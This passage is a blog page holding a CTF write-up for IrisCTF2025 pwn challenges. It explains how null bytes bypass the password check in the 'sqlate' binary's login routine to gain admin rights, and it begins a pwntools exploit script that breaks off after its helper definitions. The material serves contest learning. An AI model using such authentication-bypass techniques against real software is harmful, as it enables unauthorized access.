<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="IrisCTF2025-Pwn-Binary-Exploitation-WriteUps" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” team" />
<meta property="og:description" content="This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” team" />
<link rel="canonical" href="http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/" />
<meta property="og:url" content="http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/ico.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-07T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/ico.png" />
<meta property="twitter:title" content="IrisCTF2025-Pwn-Binary-Exploitation-WriteUps" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2025-01-07T00:00:00+08:00","datePublished":"2025-01-07T00:00:00+08:00","description":"This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” team","headline":"IrisCTF2025-Pwn-Binary-Exploitation-WriteUps","image":"/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/ico.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/"},"url":"http://localhost:4000/posts/IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/"}</script>
<!-- End Jekyll SEO tag -->


  <title>IrisCTF2025-Pwn-Binary-Exploitation-WriteUps | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/Friends/" class="nav-link">
            <i class="fa-fw fas fa-user-friends"></i>
            

            <span>FRIENDS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>IrisCTF2025-Pwn-Binary-Exploitation-WriteUps</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736179200"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2025/01/07
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/ico.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2025-CTFWP-images/2025-01-04-IrisCTF2025-Pwn-Binary-Exploitation-WriteUps/assets/ico.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2464 字"
>
  <em>13 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <blockquote>
  <p>This IrisCTF2025 binary vulnerability exploitation report was written by imLZH1, a member of the “Just For the Questions” team</p>
</blockquote>

<h2 id="sqlate"><span class="me-2">sqlate</span><a href="#sqlate" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
  
	<span class="p">......</span>

    <span class="n">init_admin</span><span class="p">();</span>
    <span class="n">login_anonymous</span><span class="p">();</span>
	<span class="p">......</span>
	<span class="k">do</span><span class="p">{</span>
		<span class="p">......</span>
        <span class="k">switch</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
          	<span class="p">......</span>
            <span class="k">case</span> <span class="sc">'5'</span><span class="p">:</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Registration is currently closed.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">action_login</span><span class="p">();</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
           <span class="p">......</span>
            <span class="k">case</span> <span class="sc">'7'</span><span class="p">:</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">check_permissions</span><span class="p">(</span><span class="n">permission_root</span><span class="p">))</span> <span class="k">continue</span><span class="p">;</span>
                <span class="n">action_sys</span><span class="p">();</span>
                <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span>
			<span class="p">......</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nb">true</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">action_sys</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/cat flag"</span><span class="p">);</span>
<span class="p">}</span>



<span class="c1">// 脆弱点</span>
<span class="kt">void</span> <span class="nf">action_login</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// Currently only admin login</span>
    <span class="n">read_to_buffer</span><span class="p">(</span><span class="s">"Password?"</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">line_buffer</span><span class="p">);</span>
	<span class="c1">// line_buffer 是我们的输入</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">512</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">line_buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">admin_password</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Wrong password!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

	<span class="c1">// 上面输入 \x00\x00 可以使length 等于 0，可以直接跳过 for循环，来到这里</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">current_user</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">);</span>
    <span class="n">current_user</span><span class="p">.</span><span class="n">userId</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">current_user</span><span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>exploit</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># from ctypes import CDLL
# cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
# imLZH1
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
